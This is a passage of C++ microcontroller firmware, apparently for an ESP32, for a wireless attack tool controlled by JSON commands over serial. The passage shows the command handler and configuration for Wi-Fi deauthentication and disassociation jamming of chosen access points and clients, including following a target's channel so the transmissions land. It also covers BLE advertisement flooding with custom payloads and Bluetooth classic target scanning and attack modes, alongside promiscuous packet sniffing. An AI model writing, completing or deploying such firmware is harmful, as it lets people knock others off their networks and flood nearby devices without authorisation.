  p["ble_adv_ms"]   = g_cfg.bleAdvMs;
  p["ble_burst_gap_ms"] = g_cfg.bleBurstGapMs;
  p["ble_power"]    = g_cfg.blePower;
  p["bt_mode"]   = g_cfg.btMode;
  p["bt_hold_ms"] = g_cfg.btHoldMs;
  p["bt_gap_ms"]  = g_cfg.btGapMs;
  p["bt_scan_ms"] = g_cfg.btScanMs;
  p["bt_auto_add"] = g_cfg.btAutoAdd;

  JsonArray t = d["targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_TARGETS; i++) {
    if (!g_targets[i].used) continue;
    char mac[18];
    macToStr(g_targets[i].bssid, mac);
    t.add(mac);
  }
  JsonArray c = d["client_targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_STAS; i++) {
    if (!g_staTargets[i].used) continue;
    char mac[18];
    macToStr(g_staTargets[i].mac, mac);
    c.add(mac);
  }
  JsonArray bt = d["bt_targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_TARGETS; i++) {
    if (!g_btTargets[i].used) continue;
    char mac[18];
    macToStr(g_btTargets[i].bssid, mac);
    bt.add(mac);
  }
  d["jamming"] = g_jamming;
  sendJson(d);
}

static void emitStatus() {
  JsonDocument d;
  d["type"]    = "status";
  d["ts"]      = millis();
  d["jamming"] = g_jamming;
  d["channel"] = g_curCh;

  JsonObject s = d["stats"].to<JsonObject>();
  s["frames"]      = g_sniffFrames;
  s["aps"]         = s_uniqueAp;
  s["clients"]     = s_uniqueSta;
  s["tx"]          = g_txCount;
  s["tx_errors"]   = g_txErrors;
  s["tx_last_err"] = g_txLastErr;
  s["send_calls"]  = g_sendCalls;
  s["inject_calls"] = g_injectCalls;
  s["burst_left"]  = s_burstLeft;
  s["rx_dropped"]  = g_rxDrops;
  s["ring_dropped"] = g_ringDrops;

  JsonObject ble = d["ble"].to<JsonObject>();
  ble["running"] = g_bleRunning;
  ble["sent"]    = g_bleSent;
  ble["errors"]  = g_bleErrors;

  JsonObject bt = d["bt"].to<JsonObject>();
  bt["running"] = g_btRunning;
  bt["sent"]    = g_btSent;
  bt["errors"]  = g_btErrors;
  bt["scanning"] = g_btScanning;
  bt["devices"] = g_btDevCount;

  uint16_t targets = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) targets++;
  d["targets"] = targets;
  sendJson(d);
}

/* ---- command parsing --------------------------------------------------- */

static JsonDocument s_rx;

static bool getInt(JsonObject p, const char *key, long lo, long hi, long *out) {
  JsonVariant v = p[key];
  if (!v.is<long>()) return false;
  long x = v.as<long>();
  if (x < lo || x > hi) return false;
  *out = x;
  return true;
}

static bool getFloat(JsonObject p, const char *key, float lo, float hi, float *out) {
  JsonVariant v = p[key];
  if (!v.is<float>() && !v.is<double>()) return false;
  float x = v.as<float>();
  if (x < lo || x > hi) return false;
  *out = x;
  return true;
}

static bool getBool(JsonObject p, const char *key, bool *out) {
  JsonVariant v = p[key];
  if (!v.is<bool>()) return false;
  *out = v.as<bool>();
  return true;
}

static void applyParams(JsonObject p) {
  long x;
  bool y;
  bool changed = false;

  if (getInt(p, "interval_ms", 1, 1000, &x)) {
    g_cfg.intervalMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst", 1, 100, &x)) {
    g_cfg.burst = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst_gap_ms", 0, 5000, &x)) {
    g_cfg.burstGapMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "channel", 1, 13, &x)) {
    g_cfg.channel = (uint8_t)x; changed = true;
  }
  if (getBool(p, "hop", &y)) { g_cfg.hop = y; changed = true; }
  if (getInt(p, "hop_ms", 10, 5000, &x)) {
    g_cfg.hopMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "reason", 1, 25, &x)) {
    g_cfg.reason = (uint16_t)x; changed = true;
  }
  if (getBool(p, "broadcast", &y)) { g_cfg.broadcast = y; changed = true; }
  if (getBool(p, "disassoc", &y)) { g_cfg.disassoc = y; changed = true; }
  if (getInt(p, "stats_ms", 0, 60000, &x)) {
    g_cfg.statsMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "repeat_ms", 0, 600000, &x)) {
    g_cfg.repeatMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "rssi_min", -120, 0, &x)) {
    g_cfg.rssiMin = (int8_t)x; changed = true;
  }
  if (getInt(p, "ble_mode", 1, 4, &x)) { g_cfg.bleMode = (uint8_t)x; changed = true; }
  if (getInt(p, "ble_adv_ms", 5, 1000, &x)) { g_cfg.bleAdvMs = (uint16_t)x; changed = true; }
  if (getInt(p, "ble_burst_gap_ms", 0, 5000, &x)) { g_cfg.bleBurstGapMs = (uint16_t)x; changed = true; }
  if (getInt(p, "ble_power", 0, 9, &x)) { g_cfg.blePower = (int8_t)x; changed = true; }
  if (getInt(p, "bt_mode", 1, 3, &x)) { g_cfg.btMode = (uint8_t)x; changed = true; }
  if (getInt(p, "bt_hold_ms", 50, 10000, &x)) { g_cfg.btHoldMs = (uint16_t)x; changed = true; }
  if (getInt(p, "bt_gap_ms", 0, 5000, &x)) { g_cfg.btGapMs = (uint16_t)x; changed = true; }
  if (getInt(p, "bt_scan_ms", 1000, 60000, &x)) { g_cfg.btScanMs = (uint16_t)x; changed = true; }
  if (getBool(p, "bt_auto_add", &y)) { g_cfg.btAutoAdd = y; changed = true; }

  (void)changed;
  if (!g_cfg.hop && g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
  ack(true, "params applied", "set");
  emitConfig();
}

static void handleLine(const char *line) {
  DeserializationError err = deserializeJson(s_rx, line);
  if (err) {
    ack(false, "bad json", "");
    return;
  }

  const char *cmd = s_rx["cmd"] | "";

  if (!strcmp(cmd, "ping")) {
    ack(true, "pong", cmd);
    return;
  }
  if (!strcmp(cmd, "status")) {
    ack(true, "ok", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "config")) {
    ack(true, "ok", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "set")) {
    applyParams(s_rx["params"].as<JsonObject>());
    return;
  }
  if (!strcmp(cmd, "targets")) {
    uint16_t n = 0;
    if (s_rx["targets"].is<JsonArray>()) n = setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    ack(true, "targets set", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "clear")) {
    uint16_t n = 0;
    for (uint16_t i = 0; i < MAX_APS; i++) if (g_aps[i].used) { g_aps[i] = ApEntry(); n++; }
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_stas[i].used) { g_stas[i] = StaEntry(); n++; }
    s_uniqueAp = s_uniqueSta = 0;
    ack(true, "tables cleared", cmd);
    return;
  }
  if (!strcmp(cmd, "jam_start")) {
    if (s_rx["targets"].is<JsonArray>()) setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    if (s_rx["client_targets"].is<JsonArray>()) setStaTargetsFromJson(s_rx["client_targets"].as<JsonArray>());

    // Kalau target pernah terlihat, ikuti channel-nya supaya TX kena.
    if (!g_cfg.hop) {
      for (uint16_t i = 0; i < MAX_TARGETS; i++) {
        if (!g_targets[i].used) continue;
        for (uint16_t j = 0; j < MAX_APS; j++) {
          if (g_aps[j].used && macEq(g_aps[j].bssid, g_targets[i].bssid) && g_aps[j].ch >= 1 && g_aps[j].ch <= 13) {
            g_cfg.channel = g_aps[j].ch;
            if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) g_curCh = g_cfg.channel;
            break;
          }
        }
        break;
      }
    }

    g_jamming = true;
    s_burstLeft = 0;
    s_tCursor = s_cCursor = 0;
    ack(true, "jamming", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "jam_stop")) {
    g_jamming = false;
    s_burstLeft = 0;
    ack(true, "stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "ble_start")) {
    if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
    const char *hex = s_rx["payload"] | "";
    uint8_t n = parseHexBytes(hex, g_bleCustom, sizeof(g_bleCustom));
    if (n) { g_bleCustomLen = n; g_cfg.bleMode = 4; }
    bleInit();
    g_bleRunning = true;
    g_bleAdvActive = false;
    g_bleLast = 0;
    ack(true, "ble flooding", cmd);
    emitConfig();
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "ble_stop")) {
    g_bleRunning = false;
    g_bleAdvActive = false;
    if (g_bleInited) esp_ble_gap_stop_advertising();
    ack(true, "ble stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "bt_targets")) {
    if (s_rx["targets"].is<JsonArray>()) setBtTargets(s_rx["targets"].as<JsonArray>());
    ack(true, "bt targets set", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "bt_scan_start")) {
    if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
    btInit();
    g_btRunning = false;
    g_btDiscoveryActive = false;
    g_btConnected = false;
    // Hasil scan sebelumnya sengaja dipertahankan supaya tidak hilang
    // kalau sweep berikutnya tidak menemukan perangkat baru.
    for (uint16_t i = 0; i < MAX_BT_DEVS; i++) g_btNameAsked[i] = Target();
    g_btDevCount = 0;
    for (uint16_t i = 0; i < MAX_BT_DEVS; i++) if (g_btDevs[i].used) g_btDevCount++;
    g_btAutoAdd = g_cfg.btAutoAdd;
    g_btScanMs = g_cfg.btScanMs;
    g_btScanStarted = millis();
    g_btLimited = false;
    g_btRestartScan = false;
    btStartDiscovery();
    g_btScanning = true;
    ack(g_btScanning, "bt scanning", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "bt_scan_stop")) {
    g_btScanning = false;
    g_btRestartScan = false;
    esp_bt_gap_cancel_discovery();
    ack(true, "bt scan stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "bt_start")) {
    if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
    if (s_rx["targets"].is<JsonArray>()) setBtTargets(s_rx["targets"].as<JsonArray>());
    g_btErrors = 0;
    g_btScanning = false;
    esp_bt_gap_cancel_discovery();
    g_btRunning = true;
    g_btDiscoveryActive = false;
    g_btConnected = false;
    g_btLast = 0;
    ack(true, "bt classic running", cmd);
    emitConfig();
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "bt_stop")) {
    g_btRunning = false;
    g_btDiscoveryActive = false;
    g_btConnected = false;
    esp_bt_gap_cancel_discovery();
    if (g_btSerial) g_btSerial->disconnect();
    ack(true, "bt classic stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "reset")) {
    g_jamming = false;
    g_bleRunning = false;
    if (g_bleInited) esp_ble_gap_stop_advertising();
    g_btRunning = false;
    g_btScanning = false;
    esp_bt_gap_cancel_discovery();
    g_btDiscoveryActive = false;
    g_btConnected = false;
    if (g_btSerial) g_btSerial->disconnect();
    g_cfg = Config();
    clearTargets();
    ack(true, "reset", cmd);
    emitConfig();
    emitStatus();
    return;
  }

  ack(false, "unknown cmd", cmd);
}

/* ---- serial link ------------------------------------------------------- */

static char s_rxLine[RX_LINE_MAX];
static size_t s_rxLen = 0;

static void linkPoll() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (s_rxLen) {
        s_rxLine[s_rxLen] = 0;
        handleLine(s_rxLine);
        s_rxLen = 0;
      }
    } else if (s_rxLen < RX_LINE_MAX - 1) {
      s_rxLine[s_rxLen++] = c;
    } else {
      s_rxLen = 0;
      g_rxDrops++;
    }
  }
}

/* ---- setup / loop ------------------------------------------------------ */

void setup() {
  Serial.begin(SERIAL_BAUD);
  uint32_t t0 = millis();
  while (!Serial && (millis() - t0) < 3000) delay(20);

  // STA tanpa asosiasi: tidak ada koneksi yang bisa bentrok dengan TX raw.
  // Jangan hidupkan softAP — itu memicu pengecekan addr2 di driver (258).
  WiFi.mode(WIFI_STA);
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous_rx_cb(&sniffCb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE);

  JsonDocument hello;
  hello["type"]   = "hello";
  hello["fw"]     = FW_VERSION;
  hello["chip"]   = ESP.getChipModel();
  hello["serial"] = SERIAL_BAUD;
  hello["proto"]  = 2;
  sendJson(hello);

  emitConfig();
  emitStatus();
}

static uint32_t s_lastStats = 0;

void loop() {
  linkPoll();
  hopTick();

  for (;;) {
    uint16_t t = s_tail.load(std::memory_order_relaxed);
    if (t == s_head.load(std::memory_order_acquire)) break;
    RawFrame &r = s_ring[t];
    if (r.kind == 1) processAp(r);
    else if (r.kind == 2) processSta(r);
    s_tail.store((uint16_t)((t + 1) % RING_LEN), std::memory_order_release);
  }

  jamTick();
  bleTick();
  btTick();
  btScanTick();
  btScanPoll();

  if (g_cfg.statsMs && (uint32_t)(millis() - s_lastStats) >= g_cfg.statsMs) {
    s_lastStats = millis();
    emitStatus();
  }

  delay(1);
}
